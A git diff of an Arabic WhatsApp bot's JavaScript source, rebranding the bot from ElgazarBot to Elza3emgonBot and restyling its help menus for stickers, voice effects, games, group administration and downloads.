 sourceUrl: "https://telegra.ph/file/25ac27774c8a0420e2649.jpg"
 }}
 }
-ElgazarBot.sendMessage(m.chat, buttonMessage, { quoted: m })
+Elza3emgonBot.sendMessage(m.chat, buttonMessage, { quoted: m })
 }
             break
 
 case 'م5': case 'اوامر التحويل': {
-teks = `• مرحبا ياروحي ⤌⤈       
+teks = `• مرحبا ⤌⤈       
 𓆩 *${pushname}* 𓆪
 𓍹——————————𓍻
 𓆩اليك قائمة باوامر التحويل𓆪
 𓍹——————————𓍻
 ( .مـلـصـق )
-♚ انشاء ملصقات عادية ومتحركة 
+☆ انشاء ملصقات عادية ومتحركة 
  ꔹ━━━━━ꔹ
 ( .سرقه )
-♚ انشاء ملصق بحقوقك 
+☆ انشاء ملصق بحقوقك 
  ꔹ━━━━━ꔹ
 ( .دمج )
-♚ دمج اثنين من الاموجي 
+☆ دمج اثنين من الاموجي 
 ꔹ━━━━━ꔹ
 ( .لصورة )
-♚ تحويل ملصق عادي لصورة 
+☆ تحويل ملصق عادي لصورة 
  ꔹ━━━━━ꔹ
 ( .لفيديو )
-♚ تحويل ملصق متحرك لفيديو 
+☆ تحويل ملصق متحرك لفيديو 
  ꔹ━━━━━ꔹ
 ( .لصوتي )
-♚ تحويل فيديو لصوتية 
+☆ تحويل فيديو لصوتية 
  ꔹ━━━━━ꔹ
 ( .لمتحرك )
-♚ تحويل ملصق لمتحرك
+☆ تحويل ملصق لمتحرك
  ꔹ━━━━━ꔹ
  ( .اظبطها )
-♚ لحذف خلفيه الصور
+☆ لحذف خلفيه الصور
 ꔹ━━━━━ꔹ
  ( .ايموجي )
-♚ تحويل ايموجي لصوره
+☆ تحويل ايموجي لصوره
  ꔹ━━━━━ꔹ
  ( .تقصير )
-♚ تقصير الروابط وجعلها قصيره
+☆ تقصير الروابط وجعلها قصيره
  ꔹ━━━━━ꔹ
 ( .اكتب )
-♚ يكتب لك علي الملصق`
+☆ يكتب لك علي الملصق`
 let buttons = [
 {buttonId: `owner`, buttonText: {displayText: 'المطور👤'}, type: 1}
 ]
@@ -8744,7 +8725,7 @@ footer: `${botname}`,
 buttons: buttons,
 headerType: 4,
 contextInfo:{externalAdReply:{
-title:"elza3em ʙᴏт",
+title:"𝚃𝙷𝙾𝙼𝙰𝚂 ",
 body: "سورس غون", 
 thumbnail: fs.readFileSync("XeonMedia/theme/cheemspic.jpg"),
 mediaType:1,
@@ -8752,39 +8733,39 @@ mediaUrl: 'https://telegra.ph/file/25ac27774c8a0420e2649.jpg',
 sourceUrl: "https://telegra.ph/file/25ac27774c8a0420e2649.jpg"
 }}
 }
-ElgazarBot.sendMessage(m.chat, buttonMessage, { quoted: m })
+Elza3emgonBot.sendMessage(m.chat, buttonMessage, { quoted: m })
 }
             break
 
 case 'م6': case 'اوامر تغير الصوت': {
-teks = `• مرحبا ياروحي ⤌⤈       
+teks = `• مرحبا ⤌⤈       
 𓆩 *${pushname}* 𓆪
 𓍹——————————𓍻
 𓆩اليك قائمة باوامر تغير الصوت𓆪
 𓍹——————————𓍻
 ( .دبه )
-♚ عمل دبه لصوت الاغنيه
+☆ عمل دبه لصوت الاغنيه
 ꔹ━━━━━ꔹ
 ( .ضوضاء )
-♚ عمل ضوضاء لصوت الاغنيه
+☆ عمل ضوضاء لصوت الاغنيه
  ꔹ━━━━━ꔹ
 ( .بطئ )
-♚ عمل تبطئ لصوت الاغنيه
+☆ عمل تبطئ لصوت الاغنيه
  ꔹ━━━━━ꔹ
 ( .بطئ2 )
-♚ عمل تبطئ لصوت الاغنيه
+☆ عمل تبطئ لصوت الاغنيه
 ꔹ━━━━━ꔹ
 ( .سريع )
-♚ عمل تسريع لصوت الاغنيه
+☆ عمل تسريع لصوت الاغنيه
  ꔹ━━━━━ꔹ
 ( .طفل )
-♚ عمل الاغنيه بصوت طفل
+☆ عمل الاغنيه بصوت طفل
  ꔹ━━━━━ꔹ
 ( .عكس )
-♚ عمل عكس لاغنيه 
+☆ عمل عكس لاغنيه 
 ꔹ━━━━━ꔹ
 ( .روبوت )
-♚ عمل الاغنيه بصوت روبوت`
+☆ عمل الاغنيه بصوت روبوت`
 let buttons = [
 {buttonId: `owner`, buttonText: {displayText: 'المطور👤'}, type: 1}
 ]
@@ -8796,7 +8777,7 @@ footer: `${botname}`,
 buttons: buttons,
 headerType: 4,
 contextInfo:{externalAdReply:{
-title:"elza3em ʙᴏт",
+title:"𝚃𝙷𝙾𝙼𝙰𝚂 ",
 body: "سورس غون", 
 thumbnail: fs.readFileSync("XeonMedia/theme/cheemspic.jpg"),
 mediaType:1,
@@ -8804,75 +8785,75 @@ mediaUrl: 'https://telegra.ph/file/25ac27774c8a0420e2649.jpg',
 sourceUrl: "https://telegra.ph/file/25ac27774c8a0420e2649.jpg"
 }}
 }
-ElgazarBot.sendMessage(m.chat, buttonMessage, { quoted: m })
+Elza3emgonBot.sendMessage(m.chat, buttonMessage, { quoted: m })
 }
             break
 
 case 'م7': case 'اوامر التسليه': {
-teks = `• مرحبا ياروحي ⤌⤈       
+teks = `• مرحبا ⤌⤈       
 𓆩 *${pushname}* 𓆪
 𓍹——————————𓍻
 𓆩اليك قائمة باوامر التسليه𓆪
 𓍹——————————𓍻
 ( .اكس )
-♚ لعبه اكس او
+☆ لعبه اكس او
  ꔹ━━━━━ꔹ
  ( .مغادره )
-♚ مغادره الجيم في اكس او
+☆ مغادره الجيم في اكس او
  ꔹ━━━━━ꔹ
  ( .الفاكهه )
-♚ لعبه الفاكهه
+☆ لعبه الفاكهه
  ꔹ━━━━━ꔹ
 ( .زواج )
-♚ البوت يزوج اثنين عشوائي
+☆ البوت يزوج اثنين عشوائي
  ꔹ━━━━━ꔹ
  ( .طلاق )
-♚ البوت يطلق اثنين عشوائي
+☆ البوت يطلق اثنين عشوائي
  ꔹ━━━━━ꔹ
  ( .زوجني )
-♚ البوت يزوجك من شخص عشوائي
+☆ البوت يزوجك من شخص عشوائي
  ꔹ━━━━━ꔹ
  ( .طلقني )
-♚ البوت يطلقك من شخص عشوائي
+☆ البوت يطلقك من شخص عشوائي
  ꔹ━━━━━ꔹ
 ( .رفيق )
-♚ البوت يجيب لك رفيق عشوائي
+☆ البوت يجيب لك رفيق عشوائي
  ꔹ━━━━━ꔹ
  ( .فراق )
-♚ البوت يفارقك من رفيقك
+☆ البوت يفارقك من رفيقك
  ꔹ━━━━━ꔹ
 ( .عكس )
-♚ عكس كلمة او جملة 
+☆ عكس كلمة او جملة 
 ꔹ━━━━━ꔹ
 ( .اختفاء )
-♚ اترك سبب ذهابك
+☆ اترك سبب ذهابك
 ꔹ━━━━━ꔹ
 ( .لولي )
-♚ صوره عشوائيه لـ لولي
+☆ صوره عشوائيه لـ لولي
  ꔹ━━━━━ꔹ
 ( .نيكو )
-♚ صوره عشوائيه لـ نيكو
+☆ صوره عشوائيه لـ نيكو
  ꔹ━━━━━ꔹ
 ( .فيد )
-♚ صوره عشوائيه لـ فيد
+☆ صوره عشوائيه لـ فيد
 ꔹ━━━━━ꔹ
 ( .انمي )
-♚ صوره عشوائيه لـ انمي
+☆ صوره عشوائيه لـ انمي
  ꔹ━━━━━ꔹ
 ( .قهوه )
-♚ صوره عشوائيه لـ قهوه
+☆ صوره عشوائيه لـ قهوه
  ꔹ━━━━━ꔹ
 (. وايفي2 )
-♚ صوره عشوائيه لـ وايفي2
+☆ صوره عشوائيه لـ وايفي2
 ꔹ━━━━━ꔹ
 ( .نيكو2 )
-♚ صوره عشوائيه لـ نيكو2
+☆ صوره عشوائيه لـ نيكو2
  ꔹ━━━━━ꔹ
  ( .نوم )
-♚ صوره عشوائيه لـ نوم
+☆ صوره عشوائيه لـ نوم
  ꔹ━━━━━ꔹ
 ( .مانجا )
-♚ صوره عشوائيه لـ مانجا`
+☆ صوره عشوائيه لـ مانجا`
 let buttons = [
 {buttonId: `owner`, buttonText: {displayText: 'المطور👤'}, type: 1}
 ]
@@ -8884,7 +8865,7 @@ footer: `${botname}`,
 buttons: buttons,
 headerType: 4,
 contextInfo:{externalAdReply:{
-title:"elza3em ʙᴏт",
+title:"𝚃𝙷𝙾𝙼𝙰𝚂 ",
 body: "سورس غون", 
 thumbnail: fs.readFileSync("XeonMedia/theme/cheemspic.jpg"),
 mediaType:1,
@@ -8892,43 +8873,43 @@ mediaUrl: 'https://telegra.ph/file/25ac27774c8a0420e2649.jpg',
 sourceUrl: "https://telegra.ph/file/25ac27774c8a0420e2649.jpg"
 }}
 }
-ElgazarBot.sendMessage(m.chat, buttonMessage, { quoted: m })
+Elza3emgonBot.sendMessage(m.chat, buttonMessage, { quoted: m })
 }
             break
 
 
 case 'مميزات': case 'المميزات': {
-teks = `• مرحبا ياروحي ⤌⤈       
+teks = `• مرحبا ⤌⤈       
 𓆩 *${pushname}* 𓆪
 𓍹——————————𓍻
 𓆩اليك قائمة بمميزات البوت𓆪 
 𓍹——————————𓍻
 ( .اذكار )
-♚ البوت يرسل لك اذكار عشوائيه
+☆ البوت يرسل لك اذكار عشوائيه
 ꔹ━━━━━ꔹ
 ( .تويت )
-♚ البوت يسالك اساله حياتيه
+☆ البوت يسالك اساله حياتيه
 ꔹ━━━━━ꔹ
 ( .انصح )
-♚ البوت يبعتلك نصايح عشوائيه
+☆ البوت يبعتلك نصايح عشوائيه
 ꔹ━━━━━ꔹ
 ( .صراحه )
-♚ البوت يبعتلك اسئله صراحه
+☆ البوت يبعتلك اسئله صراحه
 ꔹ━━━━━ꔹ
 ( .اسال )
-♚ البوت يسالك ونت جاوب
+☆ البوت يسالك ونت جاوب
 ꔹ━━━━━ꔹ
 ( .خيروك )
-♚ البوت يخيرك بين حاجتين
+☆ البوت يخيرك بين حاجتين
 ꔹ━━━━━ꔹ
 ( .كت )
-♚ البوت يجيب اسماء انمي
+☆ البوت يجيب اسماء انمي
 ꔹ━━━━━ꔹ
 ( .بوست )
-♚ البوت يرسلك لك بوست عشوائي
+☆ البوت يرسلك لك بوست عشوائي
 ꔹ━━━━━ꔹ
 ( .حروف )
-♚ البوت يرسلك حروف تكملها
+☆ البوت يرسلك حروف تكملها
 ꔹ━━━━━ꔹ`
 let buttons = [
 {buttonId: `owner`, buttonText: {displayText: 'المطور👤'}, type: 1}
@@ -8941,7 +8922,7 @@ footer: `${botname}`,
 buttons: buttons,
 headerType: 4,
 contextInfo:{externalAdReply:{
-title:"elza3em ʙᴏт",
+title:"𝚃𝙷𝙾𝙼𝙰𝚂 ",
 body: "سورس غون", 
 thumbnail: fs.readFileSync("XeonMedia/theme/cheemspic.jpg"),
 mediaType:1,
@@ -8949,12 +8930,12 @@ mediaUrl: 'https://telegra.ph/file/25ac27774c8a0420e2649.jpg',
 sourceUrl: "https://telegra.ph/file/25ac27774c8a0420e2649.jpg"
 }}
 }
-ElgazarBot.sendMessage(m.chat, buttonMessage, { quoted: m })
+Elza3emgonBot.sendMessage(m.chat, buttonMessage, { quoted: m })
 }
             break
 
 case 'م8': case 'كل الاوامر': {
-teks = `• مرحبا ياحب ⤌⤈       
+teks = `• مرحبا ⤌⤈       
 𓆩 *${pushname}* 𓆪
 • انا بوت واتس اسمي ⤌⤈
 𓆩 *${global.BotName}* 𓆪
@@ -8965,270 +8946,270 @@ teks = `• مرحبا ياحب ⤌⤈
 𓆩اليك قائمة باوامر الاعضاء𓆪 
 𓍹——————————𓍻
 ( .السرعه )
-♚ لمعرفة معلومات البوت 
+☆ لمعرفة معلومات البوت 
 ꔹ━━━━━ꔹ
 ( .التنصيب )
-♚ لعرض روابط وصنع بوت مشابه
+☆ لعرض روابط وصنع بوت مشابه
 ꔹ━━━━━ꔹ
 ( .توماس )
-♚ لمعرفه مطور البوت 
+☆ يجيب لك رقم الزعيم 
 ꔹ━━━━━ꔹ
 ( .انطق )
 𓍹——————————𓍻
 𓆩اليك قائمة باوامر المالك𓆪
 𓍹——————————𓍻
 ( .عام )
-♚ يجعل البوت عام للجميع  
+☆ يجعل البوت عام للجميع  
 ꔹ━━━━━ꔹ
 ( .خاص )
-♚ يجعل البوت خاص للمالك فقط
+☆ يجعل البوت خاص للمالك فقط
 ꔹ━━━━━ꔹ
 ( .اخرج )
-♚ خروج البوت من الجروب 
+☆ خروج البوت من الجروب 
 ꔹ━━━━━ꔹ
 ( .انضم )
-♚ ينضم البوت لجروب عبر الرابط
+☆ ينضم البوت لجروب عبر الرابط
 ꔹ━━━━━ꔹ
 ( .بلوك )
-♚ عمل بلوك لشخص من البوت 
+☆ عمل بلوك لشخص من البوت 
 ꔹ━━━━━ꔹ
 ( .فك-البلوك )
-♚ الغاء البلوك عن الشخص 
+☆ الغاء البلوك عن الشخص 
 ꔹ━━━━━ꔹ
 ( .مميز )
-♚ جعل شخص مميز بالبوت
+☆ جعل شخص مميز بالبوت
 ꔹ━━━━━ꔹ
 ( .عادي )
-♚ جعل شخص عادي بالبوت وغير مميز
+☆ جعل شخص عادي بالبوت وغير مميز
 ꔹ━━━━━ꔹ
 ( .اذاعه )
-♚ عمل اذاعه لكل الجروبات في البوت
+☆ عمل اذاعه لكل الجروبات في البوت
 ꔹ━━━━━ꔹ
 ( .جلب )
-♚ يجلب لك ملفات سكريبت جيثب 
+☆ يجلب لك ملفات سكريبت جيثب 
 𓍹——————————𓍻
 𓆩اليك قائمة باوامر الجروب𓆪
 𓍹——————————𓍻
 ( .منشن )
-♚ منشن جماعي لكل الاعضاء
+☆ منشن جماعي لكل الاعضاء
 ꔹ━━━━━ꔹ
 ( .مخفي )
-♚ منشن مخفي لكل الاعضاء 
+☆ منشن مخفي لكل الاعضاء 
 ꔹ━━━━━ꔹ
 ( .المتصلين )
-♚ يجيب لك الاعضاء المتصله
+☆ يجيب لك الاعضاء المتصله
  ꔹ━━━━━ꔹ
 ( .حذف )
-♚ حذف رسالة البوت والاعضاء
+☆ حذف رسالة البوت والاعضاء
  ꔹ━━━━━ꔹ
 ( .لينك )
-♚ جلب رابط الجروب 
+☆ جلب رابط الجروب 
 ꔹ━━━━━ꔹ
 ( .رستر )
-♚ رستارت لرابط الجروب 
+☆ رستارت لرابط الجروب 
  ꔹ━━━━━ꔹ
 ( .رفع )
-♚ رفع عضو لمشرف 
+☆ رفع عضو لمشرف 
  ꔹ━━━━━ꔹ
 ( .تنزيل )
-♚ تنزيل عضو من المشرف 
+☆ تنزيل عضو من المشرف 
 ꔹ━━━━━ꔹ
 ( .تغيرالاسم )
-♚ تغيير اسم الجروب 
+☆ تغيير اسم الجروب 
  ꔹ━━━━━ꔹ
 ( .تغيرالبايو )
-♚ تغيير وصف الجروب 
+☆ تغيير وصف الجروب 
 ꔹ━━━━━ꔹ
 ( .تغيرالصوره )
-♚ تغيير صورة الجروب 
+☆ تغيير صورة الجروب 
 ꔹ━━━━━ꔹ
 ( .جروب )
-♚ غلق وفتح الجروب 
+☆ غلق وفتح الجروب 
  ꔹ━━━━━ꔹ
 ( .طرد )
-♚ طرد شخص من الجروب 
+☆ طرد شخص من الجروب 
  ꔹ━━━━━ꔹ
 ( . اضافه )
-♚ اضافه شخص للجروب
+☆ اضافه شخص للجروب
 ꔹ━━━━━ꔹ
 ( .الروابط )
-♚ منع ارسال الروابط في الجروب
+☆ منع ارسال الروابط في الجروب
 ꔹ━━━━━ꔹ
 ( .السب )
-♚ لمنع الشتايم والسب في الجروبات
+☆ لمنع الشتايم والسب في الجروبات
 ꔹ━━━━━ꔹ
 ( .الحب )
-♚ جلب نسبه حب الشخص لك
+☆ جلب نسبه حب الشخص لك
 ꔹ━━━━━ꔹ
 ( .الكره )
-♚ نسبه كره الشخص لك
+☆ نسبه كره الشخص لك
 ꔹ━━━━━ꔹ
 ( .شخصيتك )
-♚ البوت يعرفك شخصيتك
+☆ البوت يعرفك شخصيتك
 ꔹ━━━━━ꔹ
 ( .الجمال )
-♚ يجلب لك نسبه جمالك
+☆ يجلب لك نسبه جمالك
 𓍹——————————𓍻
 𓆩اليك قائمة باوامر التنزيل𓆪
 𓍹——————————𓍻
 ( .ميديافاير )
-♚ التنزيل من ميديا فاير
+☆ التنزيل من ميديا فاير
  ꔹ━━━━━ꔹ
 ( .انستجرام )
-♚ التنزيل من انستجرام
+☆ التنزيل من انستجرام
  ꔹ━━━━━ꔹ
 ( .تيكتوك )
-♚ التنزيل من تيكتوك 
+☆ التنزيل من تيكتوك 
 ꔹ━━━━━ꔹ
 ( .شغل )
-♚ البحث عن مقطع أغنية في يوتيوب
+☆ البحث عن مقطع أغنية في يوتيوب
  ꔹ━━━━━ꔹ
  ( .تشغيل )
-♚ قائمه بحث علي اغاني في يوتيوب
+☆ قائمه بحث علي اغاني في يوتيوب
  ꔹ━━━━━ꔹ
 ( .انمي )
-♚ البحث عن خلفية انمي 
+☆ البحث عن خلفية انمي 
  ꔹ━━━━━ꔹ
 ( .صوره )
-♚ البحث عن صور عشوائية 
+☆ البحث عن صور عشوائية 
 ꔹ━━━━━ꔹ
 ( .تطقيم )
-♚ جلب تطقيمات 
+☆ جلب تطقيمات 
  ꔹ━━━━━ꔹ
 ( .فيديو )
-♚ تنزيل فيديو من يوتيوب بالرابط
+☆ تنزيل فيديو من يوتيوب بالرابط
  ꔹ━━━━━ꔹ
  ( .اغنيه )
-♚ تنزيل اغنيه من يوتيوب بالرابط
+☆ تنزيل اغنيه من يوتيوب بالرابط
  ꔹ━━━━━ꔹ
  ( .خلفيات )
-♚ تنزيل خلفيات
+☆ تنزيل خلفيات
  ꔹ━━━━━ꔹ
  ( .ويلبر )
-♚ تنزيل صور ويلبر للتليفون
+☆ تنزيل صور ويلبر للتليفون
  ꔹ━━━━━ꔹ
 ( .تخمين )
-♚ تخمين ارقام مشابهه لرقمك
+☆ تخمين ارقام مشابهه لرقمك
 𓍹——————————𓍻
 𓆩اليك قائمة باوامر التحويل𓆪
 𓍹——————————𓍻
 ( .مـلـصـق )
-♚ انشاء ملصقات عادية ومتحركة 
+☆ انشاء ملصقات عادية ومتحركة 
  ꔹ━━━━━ꔹ
 ( .سرقه )
-♚ انشاء ملصق بحقوقك 
+☆ انشاء ملصق بحقوقك 
  ꔹ━━━━━ꔹ
 ( .دمج )
-♚ دمج اثنين من الاموجي 
+☆ دمج اثنين من الاموجي 
 ꔹ━━━━━ꔹ
 ( .لصورة )
-♚ تحويل ملصق عادي لصورة 
+☆ تحويل ملصق عادي لصورة 
  ꔹ━━━━━ꔹ
 ( .لفيديو )
-♚ تحويل ملصق متحرك لفيديو 
+☆ تحويل ملصق متحرك لفيديو 
  ꔹ━━━━━ꔹ
 ( .لصوتي )
-♚ تحويل فيديو لصوتية 
+☆ تحويل فيديو لصوتية 
  ꔹ━━━━━ꔹ
 ( .لمتحرك )
-♚ تحويل ملصق لمتحرك
+☆ تحويل ملصق لمتحرك
  ꔹ━━━━━ꔹ
  ( .اظبطها )
-♚ لحذف خلفيه الصور
+☆ لحذف خلفيه الصور
 ꔹ━━━━━ꔹ
  ( .ايموجي )
-♚ تحويل ايموجي لصوره
+☆ تحويل ايموجي لصوره
  ꔹ━━━━━ꔹ
  ( .تقصير )
-♚ تقصير الروابط وجعلها قصيره
+☆ تقصير الروابط وجعلها قصيره
  ꔹ━━━━━ꔹ
 ( .اكتب )
-♚ يكتب لك علي الملصق
+☆ يكتب لك علي الملصق
 𓍹——————————𓍻
 𓆩اليك قائمة باوامر تغير الصوت𓆪
 𓍹——————————𓍻
 ( .دبه )
-♚ عمل دبه لصوت الاغنيه
+☆ عمل دبه لصوت الاغنيه
 ꔹ━━━━━ꔹ
 ( .ضوضاء )
-♚ عمل ضوضاء لصوت الاغنيه
+☆ عمل ضوضاء لصوت الاغنيه
  ꔹ━━━━━ꔹ
 ( .بطئ )
-♚ عمل تبطئ لصوت الاغنيه
+☆ عمل تبطئ لصوت الاغنيه
  ꔹ━━━━━ꔹ
 ( .بطئ2 )
-♚ عمل تبطئ لصوت الاغنيه
+☆ عمل تبطئ لصوت الاغنيه
 ꔹ━━━━━ꔹ
 ( .سريع )
-♚ عمل تسريع لصوت الاغنيه
+☆ عمل تسريع لصوت الاغنيه
  ꔹ━━━━━ꔹ
 ( .طفل )
-♚ عمل الاغنيه بصوت طفل
+☆ عمل الاغنيه بصوت طفل
  ꔹ━━━━━ꔹ
 ( .عكس )
-♚ عمل عكس لاغنيه 
+☆ عمل عكس لاغنيه 
 ꔹ━━━━━ꔹ
 ( .روبوت )
-♚ عمل الاغنيه بصوت روبوت
+☆ عمل الاغنيه بصوت روبوت
 𓍹——————————𓍻
 𓆩اليك قائمة باوامر التسليه𓆪
 𓍹——————————𓍻
 ( .اكس )
-♚ لعبه اكس او
+☆ لعبه اكس او
  ꔹ━━━━━ꔹ
  ( .مغادره )
-♚ مغادره الجيم في اكس او
+☆ مغادره الجيم في اكس او
  ꔹ━━━━━ꔹ
 ( .زواج )
-♚ البوت يزوج اثنين عشوائي
+☆ البوت يزوج اثنين عشوائي
  ꔹ━━━━━ꔹ
  ( .طلاق )
-♚ البوت يطلق اثنين عشوائي
+☆ البوت يطلق اثنين عشوائي
  ꔹ━━━━━ꔹ
  ( .زوجني )
-♚ البوت يزوجك من شخص عشوائي
+☆ البوت يزوجك من شخص عشوائي
  ꔹ━━━━━ꔹ
  ( .طلقني )
-♚ البوت يطلقك من شخص عشوائي
+☆ البوت يطلقك من شخص عشوائي
  ꔹ━━━━━ꔹ
 ( .رفيق )
-♚ البوت يجيب لك رفيق عشوائي
+☆ البوت يجيب لك رفيق عشوائي
  ꔹ━━━━━ꔹ
  ( .فراق )
-♚ البوت يفارقك من رفيقك
+☆ البوت يفارقك من رفيقك
  ꔹ━━━━━ꔹ
 ( .عكس )
-♚ عكس كلمة او جملة 
+☆ عكس كلمة او جملة 
 ꔹ━━━━━ꔹ
 ( .اختفاء )
-♚ اترك سبب ذاهبك
+☆ اترك سبب ذاهبك
 ꔹ━━━━━ꔹ
 ( .لولي )
-♚ صوره عشوائيه لـ لولي
+☆ صوره عشوائيه لـ لولي
  ꔹ━━━━━ꔹ
 ( .نيكو )
-♚ صوره عشوائيه لـ نيكو
+☆ صوره عشوائيه لـ نيكو
  ꔹ━━━━━ꔹ
 ( .فيد )
-♚ صوره عشوائيه لـ فيد
+☆ صوره عشوائيه لـ فيد
 ꔹ━━━━━ꔹ
 ( .انمي )
-♚ صوره عشوائيه لـ انمي
+☆ صوره عشوائيه لـ انمي
  ꔹ━━━━━ꔹ
 ( .قهوه )
-♚ صوره عشوائيه لـ قهوه
+☆ صوره عشوائيه لـ قهوه
  ꔹ━━━━━ꔹ
 (. وايفي2 )
-♚ صوره عشوائيه لـ وايفي2
+☆ صوره عشوائيه لـ وايفي2
 ꔹ━━━━━ꔹ
 ( .نيكو2 )
-♚ صوره عشوائيه لـ نيكو2
+☆ صوره عشوائيه لـ نيكو2
  ꔹ━━━━━ꔹ
  ( .نوم )
-♚ صوره عشوائيه لـ نوم
+☆ صوره عشوائيه لـ نوم
  ꔹ━━━━━ꔹ
 ( .مانجا )
-♚ صوره عشوائيه لـ مانجا`
+☆ صوره عشوائيه لـ مانجا`
 let buttons = [
 {buttonId: `owner`, buttonText: {displayText: 'المطور👤'}, type: 1}
 ]
@@ -9240,7 +9221,7 @@ footer: `${botname}`,
 buttons: buttons,
 headerType: 4,
 contextInfo:{externalAdReply:{
-title:"elza3em ʙᴏт",
+title:"𝚃𝙷𝙾𝙼𝙰𝚂 ",
 body: "سورس غون", 
 thumbnail: fs.readFileSync("XeonMedia/theme/cheemspic.jpg"),
 mediaType:1,
@@ -9248,7 +9229,7 @@ mediaUrl: 'https://telegra.ph/file/25ac27774c8a0420e2649.jpg',
 sourceUrl: "https://telegra.ph/file/25ac27774c8a0420e2649.jpg"
 }}
 }
-ElgazarBot.sendMessage(m.chat, buttonMessage, { quoted: m })
+Elza3emgonBot.sendMessage(m.chat, buttonMessage, { quoted: m })
 }
             break
 
@@ -9288,7 +9269,7 @@ footer: `${botname}`,
 buttons: buttons,
 headerType: 4,
 contextInfo:{externalAdReply:{
-title:"elza3em ʙᴏт",
+title:"𝚃𝙷𝙾𝙼𝙰𝚂 ",
 body: "سورس غون", 
 thumbnail: fs.readFileSync("XeonMedia/theme/cheemspic.jpg"),
 mediaType:1,
@@ -9296,7 +9277,7 @@ mediaUrl: 'https://telegra.ph/file/25ac27774c8a0420e2649.jpg',
 sourceUrl: "https://telegra.ph/file/25ac27774c8a0420e2649.jpg"
 }}
 }
-ElgazarBot.sendMessage(m.chat, buttonMessage, { quoted: m })
+Elza3emgonBot.sendMessage(m.chat, buttonMessage, { quoted: m })
 }
             break
             break
@@ -9449,7 +9430,7 @@ const listMessage = {
   buttonText: "قائمه الاختيارات",
   sections
 }
-const sendMsg = await ElgazarBot.sendMessage(m.chat, listMessage)
+const sendMsg = await Elza3emgonBot.sendMessage(m.chat, listMessage)
 }
 break
           /*  case 'allmenu': case 'كل القائمه' {
@@ -9515,7 +9496,7 @@ const buttonMessage = {
 ╠${prefix}delvote
 ╠═══════✪ MAKER 
 ╠${prefix}candy
-╠${prefix}blackpinkneon
+╠${prefix}gonpinkneon
 ╠${prefix}deepsea
 ╠${prefix}scifi
 ╠${prefix}fiction
@@ -9572,7 +9553,7 @@ const buttonMessage = {
 ╠${prefix}graffitibike
 ╠${prefix}pornhub
 ╠${prefix}glitch
-╠${prefix}blackpinkart
+╠${prefix}gonpinkart
 ╠${prefix}glitch2
 ╠${prefix}glitch3
 ╠${prefix}3dspace
@@ -9591,7 +9572,7 @@ const buttonMessage = {
 ╠${prefix}natural
 ╠${prefix}carbon
 ╠${prefix}pencil
-╠${prefix}blackpink2
+╠${prefix}gonpink2
 ╠${prefix}neon
 ╠${prefix}neonlight2
 ╠${prefix}toxic
@@ -9702,7 +9683,7 @@ const buttonMessage = {
 ╠${prefix}boneka
 ╠${prefix}rose
 ╠${prefix}kpop
-╠${prefix}blackpink
+╠${prefix}gonpink
 ╠${prefix}ulzzangboy
 ╠${prefix}ulzzanggirl
 ╠${prefix}pubg
@@ -10180,7 +10161,7 @@ const buttonMessage = {
     buttons: buttons,
     headerType: 4
 }
-const sendMsg = await ElgazarBot.sendMessage(m.chat, buttonMessage)
+const sendMsg = await Elza3emgonBot.sendMessage(m.chat, buttonMessage)
 }
 break*/
       case 'ownermenu':{
@@ -10211,7 +10192,7 @@ const buttonMessage = {
     buttons: buttons,
     headerType: 4
 }
-const sendMsg = await ElgazarBot.sendMessage(m.chat, buttonMessage)
+const sendMsg = await Elza3emgonBot.sendMessage(m.chat, buttonMessage)
 }
 break
             case 'groupmenu':{
@@ -10269,7 +10250,7 @@ const buttonMessage = {
     buttons: buttons,
     headerType: 4
 }
-const sendMsg = await ElgazarBot.sendMessage(m.chat, buttonMessage)
+const sendMsg = await Elza3emgonBot.sendMessage(m.chat, buttonMessage)
 }
 break
 case 'makermenu':{
@@ -10288,7 +10269,7 @@ const buttonMessage = {
 ╠${prefix}horror
 ╠${prefix}hoorror
 ╠${prefix}retro
-╠${prefix}blackpinkneon
+╠${prefix}gonpinkneon
 ╠${prefix}deepsea
 ╠${prefix}scifi
 ╠${prefix}fiction
@@ -10345,7 +10326,7 @@ const buttonMessage = {
 ╠${prefix}graffitibike
 ╠${prefix}pornhub
 ╠${prefix}glitch
-╠${prefix}blackpinkart
+╠${prefix}gonpinkart
 ╠${prefix}glitch2
 ╠${prefix}glitch3
 ╠${prefix}3dspace
@@ -10364,7 +10345,7 @@ const buttonMessage = {
 ╠${prefix}natural
 ╠${prefix}carbon
 ╠${prefix}pencil
-╠${prefix}blackpink2
+╠${prefix}gonpink2
 ╠${prefix}neon
 ╠${prefix}neonlight2
 ╠${prefix}toxic
@@ -10393,7 +10374,7 @@ const buttonMessage = {
     buttons: buttons,
     headerType: 4
 }
-const sendMsg = await ElgazarBot.sendMessage(m.chat, buttonMessage)
+const sendMsg = await Elza3emgonBot.sendMessage(m.chat, buttonMessage)
 }
 break
             case 'downloadmenu':{
@@ -10420,7 +10401,7 @@ const buttonMessage = {
     buttons: buttons,
     headerType: 4
 }
-const sendMsg = await ElgazarBot.sendMessage(m.chat, buttonMessage)
+const sendMsg = await Elza3emgonBot.sendMessage(m.chat, buttonMessage)
 }
 break
             case 'searchmenu':{
@@ -10457,7 +10438,7 @@ const buttonMessage = {
     buttons: buttons,
     headerType: 4
 }
-const sendMsg = await ElgazarBot.sendMessage(m.chat, buttonMessage)
+const sendMsg = await Elza3emgonBot.sendMessage(m.chat, buttonMessage)
 }
 break
             case 'convertmenu':{
@@ -10503,7 +10484,7 @@ const buttonMessage = {
     buttons: buttons,
     headerType: 4
 }
-const sendMsg = await ElgazarBot.sendMessage(m.chat, buttonMessage)
+const sendMsg = await Elza3emgonBot.sendMessage(m.chat, buttonMessage)
 }
 break
 case 'randomimagemenu':{
@@ -10545,7 +10526,7 @@ const buttonMessage = {
 ╠${prefix}boneka
 ╠${prefix}rose
 ╠${prefix}kpop
-╠${prefix}blackpink
+╠${prefix}gonpink
 ╠${prefix}ulzzangboy
 ╠${prefix}ulzzanggirl
 ╠${prefix}pubg
@@ -10559,7 +10540,7 @@ const buttonMessage = {
     buttons: buttons,
     headerType: 4
 }
-const sendMsg = await ElgazarBot.sendMessage(m.chat, buttonMessage)
+const sendMsg = await Elza3emgonBot.sendMessage(m.chat, buttonMessage)
 }
 break
 case 'randomvideomenu':{
@@ -10586,7 +10567,7 @@ const buttonMessage = {
     buttons: buttons,
     headerType: 4
 }
-const sendMsg = await ElgazarBot.sendMessage(m.chat, buttonMessage)
+const sendMsg = await Elza3emgonBot.sendMessage(m.chat, buttonMessage)
 }
 break
            case 'emotemenu':{
@@ -10617,7 +10598,7 @@ const buttonMessage = {
     buttons: buttons,
     headerType: 4
 }
-const sendMsg = await ElgazarBot.sendMessage(m.chat, buttonMessage)
